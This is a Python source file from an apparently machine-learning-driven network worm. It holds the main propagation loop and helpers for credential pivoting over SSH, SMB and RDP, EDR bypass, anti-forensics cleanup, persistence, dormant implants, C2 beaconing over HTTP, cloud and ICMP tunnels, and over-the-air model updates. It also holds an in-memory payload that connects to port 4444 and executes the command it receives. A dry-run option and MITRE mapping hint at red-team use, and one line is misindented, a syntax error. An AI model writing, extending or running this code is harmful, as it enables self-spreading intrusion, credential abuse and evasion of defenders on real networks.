import os
import time
from datetime import datetime
from typing import Dict

from .module_imports import logger
from .standalone import get_local_ip


class WormCorePropagation:
    def _online_learning_step(self):
        memory = self.rl_agent.memory
        if len(memory) < 16:
            return

        batch_size = min(64, max(16, len(memory) // 4))
        n_passes = min(3, max(1, len(memory) // 64))

        logger.info(
            f"Online learning: {len(memory)} experiences, batch={batch_size}, passes={n_passes}"
        )

        for _ in range(n_passes):
            self.rl_agent.replay(batch_size=batch_size)

        if self.use_thompson_sampling and hasattr(self.rl_agent, "replay_ensemble"):
            try:
                self.rl_agent.replay_ensemble(batch_size=max(16, batch_size // 2))
            except Exception as e:
                logger.debug(f"Thompson ensemble replay failed: {e}")

        self.rl_agent.update_target_model(tau=0.01)

        if self.rl_agent.epsilon > 0.05:
            self.rl_agent.epsilon = max(0.05, self.rl_agent.epsilon * 0.99)

        try:
            checkpoint_path = self.config.ml.rl_agent_path.replace(".h5", "_online.h5")
            self.rl_agent.save(checkpoint_path)
        except Exception as e:
            logger.debug(f"Failed to save online checkpoint: {e}")

    def _credential_pivot_cycle(self):
        if not self.cred_manager or not self.scan_results:
            return

        discovered = self.cred_manager.get_discovered_credentials()
        if not discovered:
            return

        uninfected = [
            h
            for h in self.scan_results
            if h["ip"] not in self.infected_hosts and h["ip"] not in self.failed_targets
        ]

        if not uninfected:
            return

        logger.info(f"Credential pivot: trying {len(discovered)} creds on {len(uninfected)} hosts")

        if self.contextual_bandit:
            try:
                host = uninfected[0]
                ctx = {
                    "service": (
                        "ssh"
                        if 22 in host.get("open_ports", [])
                        else "smb" if 445 in host.get("open_ports", []) else "unknown"
                    ),
                    "os": host.get("os_guess", "Unknown"),
                    "ports": host.get("open_ports", []),
                    "is_high_value": host.get("vulnerability_score", 0) > 70,
                    "is_domain_controller": host.get("host_type") == "domain_controller",
                    "is_database": host.get("host_type") == "database",
                    "target_count": len(self.infected_hosts),
                }
                    bandit_cred = self.contextual_bandit.select_credential(discovered, ctx)
                if bandit_cred:
                    username, password, ucb = bandit_cred
                    discovered = [(username, password)] + [
                        c for c in discovered if c != (username, password)
                    ]
            except Exception as e:
                logger.debug(f"Bandit credential selection failed: {e}")

        for username, password in discovered[:5]:
            for host in uninfected:
                ip = host["ip"]
                ports = host.get("open_ports", [])

                service = None
                if 22 in ports:
                    service = "ssh"
                elif 445 in ports:
                    service = "smb"
                elif 3389 in ports:
                    service = "rdp"
                elif 80 in ports or 8080 in ports:
                    service = "http"

                if not service:
                    continue

                logger.debug(f"Pivot: {username} -> {ip} ({service})")

                if self.dry_run:
                    continue

                success = self._try_service_login(
                    ip, ports[0] if ports else 22, service, username, password
                )
                if success:
                    logger.success(f"Pivot success: {username} -> {ip} ({service})")
                    if ip not in self.infected_hosts:
                        self.infected_hosts.add(ip)
                        self.stats["infections"] += 1
                        if self.knowledge_graph:
                            self.knowledge_graph.mark_infected(ip, f"pivot_{service}")
                        if self.mitre_mapper:
                            try:
                                self.mitre_mapper.record(
                                    wormy_technique="credential_pivot",
                                    target=ip,
                                    success=True,
                                    details={"service": service, "username": username},
                                )
                            except Exception:
                                pass
                    self.cred_manager.record_attempt(ip, username, True)
                else:
                    self.cred_manager.record_attempt(ip, username, False)

    def _run_adaptive_cycle(self, iteration: int):
        if not self.adaptive_cycle:
            return

        logger.info(f"\n{'=' * 60}")
        logger.info(f"ADAPTIVE CYCLE #{self.adaptive_cycle.cycle_count + 1}")
        logger.info(f"{'=' * 60}")

        scan_results = self.scan_results or []
        exploit_results = {}
        available_exploits = []

        if self.exploit_manager:
            available_exploits = [e.name for e in self.exploit_manager.exploits[:10]]

        cycle_result = self.adaptive_cycle.run_cycle(
            scan_results=scan_results,
            exploit_results=exploit_results,
            available_exploits=available_exploits,
        )

        for rec in cycle_result.get("recommendations", []):
            logger.info(f"  -> {rec}")

        if self.dormant_cells and self.infected_hosts:
            for ip in list(self.infected_hosts)[-3:]:
                if ip not in [c["host_ip"] for c in self.dormant_cells.cells.values()]:
                    cell_id = self.dormant_cells.deploy_cell(ip, max_dormant_days=7)
                    logger.info(f"  Dormant cell deployed: {cell_id} on {ip}")

    def _check_distributed_redundancy(self):
        if not self.distributed_redundancy:
            return

        for ip in self.infected_hosts:
            if ip != get_local_ip():
                self.distributed_redundancy.add_peer(ip)

        repairs = self.distributed_redundancy.check_and_repair()
        if repairs:
            for repair in repairs:
                logger.info(
                    f"  Distributed repair: {repair['action']} on {repair.get('peer_ip', '?')}"
                )

    def _post_exploitation_cleanup(self, ip: str, target: Dict):
        os_guess = target.get("os_guess", "Unknown").lower()

        if "windows" in os_guess:
            try:
                edr_detected = self.edr_bypass.detect_edr()
                if edr_detected:
                    logger.warning(f"EDR detected on {ip}: {edr_detected}")
                    bypass_results = self.edr_bypass.apply_all_bypasses()
                    successful_bypasses = [k for k, v in bypass_results.items() if v]
                    if successful_bypasses:
                        logger.success(f"EDR bypass successful on {ip}: {successful_bypasses}")
                        self._detection_events.append(
                            {
                                "type": "edr_bypass",
                                "ip": ip,
                                "techniques": successful_bypasses,
                                "timestamp": datetime.now().isoformat(),
                            }
                        )
            except Exception as e:
                logger.debug(f"EDR bypass failed on {ip}: {e}")

        try:
            cleanup_results = self.anti_forensics.clean_all_tracks()
            successful_cleanups = [k for k, v in cleanup_results.items() if v]
            if successful_cleanups:
                logger.debug(f"Anti-forensics cleanup on {ip}: {successful_cleanups}")
        except Exception as e:
            logger.debug(f"Anti-forensics failed on {ip}: {e}")

        if self.memory_execution:
            try:
                payload = f"import socket,subprocess,shlex; s=socket.socket(); s.connect(('{ip}', 4444)); cmd=s.recv(4096).decode(); s.close(); subprocess.call(shlex.split(cmd))"
                success = self.memory_execution.execute_in_memory(payload.encode())
                if success:
                    logger.debug(f"In-memory payload executed on {ip}")
            except Exception as e:
                logger.debug(f"Memory execution failed on {ip}: {e}")

        if self.direct_syscalls:
            try:
                if self.direct_syscalls.available():
                    logger.debug(f"Direct syscalls available on {ip}")
                    syscalls = self.direct_syscalls.get_resolved_syscalls()
                    if syscalls:
                        logger.debug(f"Resolved {len(syscalls)} syscalls for {ip}")
            except Exception as e:
                logger.debug(f"Direct syscalls check failed on {ip}: {e}")

        if self.sleep_obfuscator:
            try:
                self.sleep_obfuscator.obfuscated_sleep(0.1)
                logger.debug(f"Sleep obfuscation verified on {ip}")
            except Exception as e:
                logger.debug(f"Sleep obfuscation failed on {ip}: {e}")

        if self.mitre_mapper:
            try:
                self.mitre_mapper.record(
                    wormy_technique="defense_evasion",
                    target=ip,
                    success=True,
                    details={"phase": "post_exploitation_cleanup"},
                )
            except Exception:
                pass

    def propagate(self):
        logger.info("Starting propagation")
        self.running = True
        self.start_time = datetime.now()
        self.stats["start_time"] = self.start_time

        local_ip = get_local_ip()
        self.infected_hosts.add(local_ip)

        if self.knowledge_graph:
            self.knowledge_graph.add_host(local_ip, is_infected=True)
            self.knowledge_graph.mark_infected(local_ip, "origin")

        if self.host_monitor:
            self.host_monitor.register_host(
                local_ip, os_guess="Local", ports=[], exploit_method="origin"
            )
            self.host_monitor.start_monitoring(interval=30)
            logger.info("Host Monitor started (continuous monitoring + self-healing)")

        if self.c2_server:
            try:
                self.c2_server.run_background()
                logger.info(
                    f"C2 Server started on {self.config.c2.c2_server}:{self.config.c2.c2_port}"
                )
            except Exception as e:
                logger.warning(f"Failed to start C2 Server: {e}")

        if self.web_dashboard:
            try:
                self.web_dashboard.run_background()
                logger.info("Web Dashboard started at http://0.0.0.0:5000")
                time.sleep(1)
                try:
                    import webbrowser

                    webbrowser.open("http://localhost:5000", new=2)
                except Exception:
                    pass
            except Exception as e:
                logger.warning(f"Failed to start Web Dashboard: {e}")

        if self.armitage_dashboard:
            try:
                self.armitage_dashboard.run_background()
                logger.info("Armitage Dashboard started at http://0.0.0.0:5001")
                time.sleep(1)
                try:
                    import webbrowser

                    webbrowser.open("http://localhost:5001", new=2)
                except Exception:
                    pass
            except Exception as e:
                logger.warning(f"Failed to start Armitage Dashboard: {e}")

        if self.multi_operator:
            try:
                self.multi_operator.start(background=True)
                logger.info("Multi-Operator Server started on port 8444")
            except Exception as e:
                logger.warning(f"Multi-Operator Server failed to start: {e}")

        if self.icmp_tunnel:
            try:
                self.icmp_tunnel.start_listener(
                    callback=lambda msg: logger.debug(f"ICMP msg: {msg}")
                )
                logger.info("ICMP Tunnel listener started")
            except Exception as e:
                logger.warning(f"ICMP Tunnel listener failed: {e}")

        if self.local_persistence:
            try:
                from .module_imports import WORM_FILE_PATH

                payload_path = WORM_FILE_PATH
                result, details = self.local_persistence.establish_persistence(payload_path)
                if result:
                    logger.info("Local persistence established on origin host")
            except Exception as e:
                logger.debug(f"Local persistence failed: {e}")

        if self.advanced_persistence:
            try:
                from .module_imports import WORM_FILE_PATH

                payload_path = WORM_FILE_PATH
                results = self.advanced_persistence.install_all(payload_path)
                success_count = sum(1 for v in results.values() if v)
                if success_count:
                    logger.info(
                        f"Advanced persistence: {success_count}/{len(results)} techniques active"
                    )
            except Exception as e:
                logger.debug(f"Advanced persistence failed: {e}")

        if self.mitre_mapper:
            try:
                self.mitre_mapper.record(
                    wormy_technique="persistence",
                    target=local_ip,
                    success=True,
                    details={"phase": "initial_persistence"},
                )
            except Exception:
                pass

        iteration = 0
        online_learning_interval = 10
        adaptive_cycle_interval = 5

        while self.running and self.check_safety_constraints():
            iteration += 1
            logger.info(f"\n{'=' * 60}")
            logger.info(f"PROPAGATION ITERATION {iteration}")
            logger.info(f"{'=' * 60}")

            if iteration == 1 or iteration % 5 == 0:
                self.scan_network()

            if self.adaptive_cycle and iteration % adaptive_cycle_interval == 0:
                self._run_adaptive_cycle(iteration)

            if self.cred_manager and iteration % 3 == 0:
                self._credential_pivot_cycle()

            if self.config.ml.online_learning and iteration % online_learning_interval == 0:
                self._online_learning_step()

            if self.c2_server and getattr(self.c2_server, "pending_brain_update", None):
                update_path = self.c2_server.pending_brain_update
                if os.path.exists(update_path):
                    logger.success("Applying Over-The-Air Brain Update...")
                    try:
                        self.rl_agent.load(update_path)
                        logger.success(
                            "OTA Brain Update applied successfully. Worm is now using new ML weights."
                        )
                        self.c2_server.pending_brain_update = None
                        os.remove(update_path)
                    except Exception as e:
                        logger.error(f"Failed to apply OTA Brain Update: {e}")

            if self.distributed_redundancy and iteration % 10 == 0:
                self._check_distributed_redundancy()

            target = self.select_next_target()
            if not target:
                logger.warning("No more targets available")
                break

            self.exploit_target(target)

            if self.config.evasion.stealth_mode:
                self._post_exploitation_cleanup(target["ip"], target)

            if self.c2_server and target["ip"] in self.infected_hosts:
                try:
                    self.c2_server.process_beacon(
                        {
                            "host_id": target["ip"],
                            "ip": target["ip"],
                            "hostname": target.get("hostname", "unknown"),
                            "os": target.get("os_guess", "Unknown"),
                            "ports": target.get("open_ports", []),
                            "beacon_type": "infection",
                        }
                    )
                    self.stats["c2_beacons"] += 1
                except Exception as e:
                    logger.debug(f"C2 beacon failed: {e}")

            if self.cloud_c2 and target["ip"] in self.infected_hosts:
                try:
                    self.cloud_c2.beacon(
                        {
                            "event": "beacon",
                            "ip": target["ip"],
                            "os": target.get("os_guess", "Unknown"),
                            "iteration": iteration,
                        }
                    )
                except Exception:
                    pass

            if self.icmp_tunnel and target["ip"] in self.infected_hosts:
                try:
                    self.icmp_tunnel.beacon(
                        {
                            "ip": target["ip"],
                            "os": target.get("os_guess", "Unknown"),
                            "iteration": iteration,
                        }
                    )
                except Exception:
                    pass

            if self.pfs_crypto and target["ip"] in self.infected_hosts:
                self.stats["pfs_beacons"] = self.stats.get("pfs_beacons", 0) + 1

            if self.mitre_mapper:
                try:
                    self.mitre_mapper.record(
                        wormy_technique="execution",
                        target=target["ip"],
                        success=target["ip"] in self.infected_hosts,
                        details={"iteration": iteration, "method": "propagate"},
                    )
                except Exception:
                    pass

            if self.plugin_manager and iteration % 5 == 0:
                try:
                    for plugin in self.plugin_manager.get_enabled_plugins():
                        plugin_instance = self.plugin_manager.load_plugin(plugin.name)
                        if plugin_instance and hasattr(plugin_instance, "execute"):
                            try:
                                plugin_instance.execute(worm_core=self)
                            except Exception:
                                pass
                except Exception:
                    pass

            if self.wave_propagation and iteration % 3 == 0 and len(self.infected_hosts) > 1:
                try:
                    targets = [
                        h
                        for h in self.scan_results
                        if h["ip"] not in self.infected_hosts and h["ip"] not in self.failed_targets
                    ]
                    if targets and self.cred_manager:
                        creds = self.cred_manager.get_discovered_credentials()
                        if creds:
                            self.wave_propagation.propagate_wave(
                                targets=targets,
                                credentials=creds,
                                exploit_fn=self.exploit_target,
                                wave=iteration // 3,
                                c2_server=f"{self.config.c2.c2_server}:{self.config.c2.c2_port}",
                            )
                except Exception as e:
                    logger.debug(f"Wave propagation failed: {e}")

            if self.swarm_coordinator and self.swarm_agent and iteration % 3 == 0:
                try:
                    knowledge = {h["ip"]: h for h in getattr(self, "scan_results", [])}
                    self.swarm_coordinator.share_knowledge(self.swarm_agent.agent_id, knowledge)
                    for h_ip in self.infected_hosts:
                        self.swarm_agent.report_infection(h_ip)
                    stats = self.swarm_coordinator.get_swarm_statistics()
                    logger.debug(
                        f"Swarm: {stats['total_agents']} agents, {stats['total_infected']} infected"
                    )
                except Exception as e:
                    logger.debug(f"Swarm knowledge sharing failed: {e}")

            if self.agent_controller and iteration % 2 == 0:
                try:
                    self.agent_controller.heartbeat_check()
                except Exception as e:
                    logger.debug(f"Agent controller tick failed: {e}")

            if self.advanced_self_healing and iteration % 10 == 0:
                try:
                    health = self.advanced_self_healing.perform_health_check()
                    if health.get("integrity", 1.0) < 0.5:
                        logger.warning(
                            f"Integrity low ({health['integrity']:.2f}) -- file may be tampered"
                        )
                except Exception as e:
                    logger.debug(f"Self-healing check failed: {e}")

            if self.config.propagation.propagation_delay > 0:
                time.sleep(self.config.propagation.propagation_delay)

            if len(self.infected_hosts) >= self.config.propagation.max_infections:
                logger.success(f"Max infections: {len(self.infected_hosts)}")
                break

            self.print_status()

        self.stats["end_time"] = datetime.now()
        self.running = False
        logger.success("Propagation complete")
        self.print_final_report()

    def stop(self):
        self.running = False
        logger.info("Stopping propagation...")
